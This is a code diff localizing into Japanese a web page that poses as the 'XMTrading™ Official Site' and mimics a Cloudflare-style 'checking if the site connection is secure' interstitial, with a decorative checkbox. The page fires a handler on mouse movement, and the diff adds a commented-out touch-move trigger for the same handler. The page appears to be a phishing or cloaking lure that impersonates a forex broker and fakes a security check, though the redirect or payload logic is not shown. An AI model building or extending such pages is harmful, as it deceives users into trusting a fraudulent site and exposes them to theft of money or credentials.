@@ -14,10 +14,11 @@ export default function Home() {
     <div
       onMouseMove={handleClick}
       // onClick={handleClick}
+      // onTouchMove={handleClick}
     >
       <main className={styles.main}>
         <h3 className={styles.text}>
-          XMTrading™ Official Site{" "}
+          XMTrading™ - (エックスエム) 公式サイト{" "}
           <span
             style={{ transform: "translate(0px)", display: "inline-block" }}
           >
@@ -25,22 +26,20 @@ export default function Home() {
           </span>
         </h3>
         <p className={styles.text2}>
-          Checking if the site connection is secure
+          サイトの接続が安全か確認しています
         </p>
         <p className={styles.text3}>
-          We needs to review the security of your connection before proceeding
-          XMTrading™
+          続行する前に接続のセキュリティを確認する必要があります。
+          XMTrading™ - (エックスエム)
         </p>
        
         <div style={{ marginTop: 30, position: "relative" }}>
           <Image src={image} alt="Logo" className={styles.image2} />
           <input type="checkbox" className={styles.checkbox} />
         </div>
-        <p className={styles.text4}>Why am I seeing this page?</p>
+        <p className={styles.text4}>なぜこのページが表示されているのですか？</p>
         <p className={styles.text5}>
-          Requests from malicious bots can pose as legitimate traffic.
-          Occasionally, you may see this page while the site ensures that the
-          connection is secure.
+        悪意のあるボットからのリクエストが正規のトラフィックのように見えることがあります。サイトが接続のセキュリティを確認している間に、このページが表示されることがあります。
         </p>
       </main>
     </div>
